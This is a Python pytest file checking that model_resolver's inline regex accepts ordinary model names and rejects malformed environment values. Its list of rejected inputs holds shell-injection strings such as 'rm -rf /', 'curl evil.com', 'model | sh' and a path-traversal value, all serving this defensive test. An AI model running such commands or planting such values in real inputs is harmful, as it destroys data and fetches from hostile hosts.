"""Round 71 / Phase 5 (#28) -- model_resolver inline regex defense.

Pre-R71 ``model_resolver._read_env_value`` swallowed the ImportError
on ``adoptiq_settings`` and returned the env value verbatim.  A
malformed env-var (operator pasted ``"gpt-5-nano; rm -rf /"`` or a
shell-quoted token by mistake) propagated past the resolver into
``CircuitChatClient``, where the strict allow-list rejected it -- but
with a confusing "no model name provided" message because the value
was silently dropped at a deeper layer.

Round 71 / Phase 5 (#28) adds an inline regex (``_R71_INLINE_MODEL_NAME_RE``)
as defense-in-depth so the env-var validator works even when
``adoptiq_settings`` cannot be imported.
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

import model_resolver


def test_round71_inline_model_name_regex_present() -> None:
    """The inline regex MUST be defined as a module-level constant."""
    assert hasattr(model_resolver, "_R71_INLINE_MODEL_NAME_RE")
    assert model_resolver._R71_INLINE_MODEL_NAME_RE is not None


def test_round71_inline_validator_accepts_canonical_model_names() -> None:
    """Standard model name shapes MUST pass the inline allow-list."""
    fn = model_resolver._r71_inline_is_valid_model_name
    canonical_names = [
        "gpt-4o",
        "gpt-4o-mini",
        "gpt-5-nano",
        "claude-3-5-sonnet-20241022",
        "model_name",
        "model.v1",
        "ABC123",
    ]
    for name in canonical_names:
        assert fn(name), (
            f"Round 71 / Phase 5 (#28): inline validator must accept "
            f"canonical model name {name!r}."
        )


def test_round71_inline_validator_rejects_shell_injection() -> None:
    """Shell-injection attempts MUST be rejected."""
    fn = model_resolver._r71_inline_is_valid_model_name
    rejected_names = [
        "gpt-5-nano; rm -rf /",
        "gpt-4o && curl evil.com",
        "model | sh",
        "model$(whoami)",
        "model`whoami`",
        'model"; rm',
        "../../../etc/passwd",
        "model with spaces",
    ]
    for name in rejected_names:
        assert not fn(name), (
            f"Round 71 / Phase 5 (#28): inline validator must REJECT "
            f"injection attempt {name!r}."
        )


def test_round71_inline_validator_rejects_empty_or_too_long() -> None:
    """Empty / overly-long values MUST be rejected."""
    fn = model_resolver._r71_inline_is_valid_model_name
    assert not fn(""), "empty string"
    assert not fn(None), "None"
    assert not fn("x" * 200), "200 chars (over 128 cap)"


def test_round71_env_value_falls_back_to_inline_when_settings_unimportable(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """When ``adoptiq_settings`` cannot be imported, ``_read_env_value``
    MUST still validate via the inline regex (not return the env value
    verbatim)."""
    monkeypatch.setenv("ROUND71_TEST_MODEL", "valid-model-name")
    # Make adoptiq_settings unimportable by installing a sentinel that
    # raises on import.  Since ``_read_env_value`` does
    # ``import adoptiq_settings as _settings`` inside a try/except, we
    # patch the module-level adoptiq_settings to raise on attribute access.
    import sys
    saved = sys.modules.get("adoptiq_settings")
    sys.modules["adoptiq_settings"] = None  # type: ignore[assignment]
    try:
        out = model_resolver._read_env_value("ROUND71_TEST_MODEL")
        assert out == "valid-model-name", (
            f"Round 71 / Phase 5 (#28): valid env value should still be "
            f"accepted via the inline regex when adoptiq_settings is "
            f"unimportable; got {out!r}."
        )
    finally:
        if saved is not None:
            sys.modules["adoptiq_settings"] = saved
        else:
            sys.modules.pop("adoptiq_settings", None)


def test_round71_env_value_rejected_by_inline_regex(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A malformed env value MUST be rejected by the inline regex
    when adoptiq_settings is unimportable (returns None)."""
    monkeypatch.setenv("ROUND71_TEST_MODEL_BAD", "model; rm -rf /")
    import sys
    saved = sys.modules.get("adoptiq_settings")
    sys.modules["adoptiq_settings"] = None  # type: ignore[assignment]
    try:
        out = model_resolver._read_env_value("ROUND71_TEST_MODEL_BAD")
        assert out is None, (
            f"Round 71 / Phase 5 (#28): malformed env value must be "
            f"rejected by inline regex; got {out!r}."
        )
    finally:
        if saved is not None:
            sys.modules["adoptiq_settings"] = saved
        else:
            sys.modules.pop("adoptiq_settings", None)
